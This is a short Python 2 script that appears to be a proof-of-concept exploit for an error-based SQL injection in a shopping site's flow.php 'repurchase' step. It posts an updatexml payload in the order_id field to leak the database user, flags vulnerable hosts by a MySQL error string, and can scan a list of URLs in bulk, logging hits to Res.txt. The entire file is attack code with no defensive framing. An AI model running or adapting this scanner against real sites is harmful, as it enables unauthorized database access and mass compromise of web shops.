import requests as req
import optparse

def poc(url):
    xode='MySQL server error report:Array'
    url=url+'/flow.php'
    try:
        rgg=req.get(url)
        
    except:
        return '[-]Getting '+url+' Wrong'
        
    if rgg.status_code !=200:
         return '[-]'+url+' Wrong'

    geturl=url+'?step=repurchase'
    payload={'order_id':'1 or updatexml(1,concat(0x7e7e,(user())),0) or 11#'}
    a=req.post(geturl,data=payload)

    if a.status_code==200:
        print a.content
        if xode in a.text:
            return 2
        else: 
            return '[-]'+url+'Exploiting Fail'
    else:
        return '[-]'+url+' Fail!!'

def ifhttp(url):
    if 'http://' in url:
        return url
    else:
        return 'http://'+url

def r(filename):
    try:
        ff= open(filename).readlines()
    except:
        print'[-] The file is not exist'
        exit(0)
    return ff

def w(url):
    f=open('Res.txt','a+')
    f.write(url+'\n')
    f.close

if __name__=='__main__':
    parser = optparse.OptionParser('usage%prog -u <url> -r <file>')
    parser.add_option('-u', dest='url', type='string', help='the website')
    parser.add_option('-r', dest='file', type='string', help='the file')

    (options, args) = parser.parse_args()
    url = options.url
    
    f=options.file
    if options.url == None and f==None:
        print(parser.usage)
        exit(0)
    if options.url!=None:
        url=ifhttp(url)
        r=poc(url)
        if r==2:
            print '[+]'+url+' succeed'
            w(url)
        else:
            print r
    if f!=None:
         for fff in r(f):
             b=fff.strip('\n')
             r=poc(ifhttp(b))
             if r==2:
                print '[+]'+b+' succeed'
                w(b)
             else:
                 print r
